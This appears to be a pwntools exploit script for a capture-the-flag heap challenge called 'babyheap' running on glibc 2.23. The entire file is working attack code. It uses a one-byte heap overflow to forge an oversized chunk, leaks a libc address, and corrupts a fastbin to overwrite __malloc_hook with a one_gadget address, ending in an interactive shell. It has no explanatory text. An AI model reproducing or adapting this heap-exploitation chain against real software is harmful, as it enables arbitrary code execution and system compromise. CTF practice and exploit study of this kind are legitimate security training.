from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	pass

def menu(choice):
	p.sendlineafter("Command: ",str(choice))

def add(size):
	menu(1)
	p.sendlineafter("Size: ",str(size))
	#p.recvuntil("Allocated\n")

def edit(index,size,content):
	menu(2)
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",content)
	p.recvuntil("Updated\n")

def free(index):
	menu(3)
	p.sendlineafter("Index: ",str(index))

def show(index):
	menu(4)
	p.sendlineafter("Index: ",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		#gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x11BB)))
		gdb.attach(p,"b malloc")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
size = 0x48
add(size) #0
add(size) #1
add(size) #2
add(size) #3
payload = "a" * size + "\xa1"
edit(0,size + 1,payload)
free(1)
add(size) #1
show(2)
p.recvuntil("Chunk[2]: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
add(size) #4
free(2)
#debugf()
target = libc.symbols["__malloc_hook"] - 3 + 0x30 + 0x8
payload = p64(target)
edit(4,len(payload),payload)
add(size + 0x10) #2
free(2)
add(size) #2
add(size) #5
target = libc.symbols["__malloc_hook"] - 0x10
payload = "a" * 3 + p64(0) * 4 + p64(target)
debugf()
edit(5,len(payload),payload)
log.success("one_gadget:" + hex(libc.address + 0x45216))
add(size - 0x10) #6
target = libc.address + 0x4526a
edit(6,8,p64(target))
add(size)
p.interactive()	
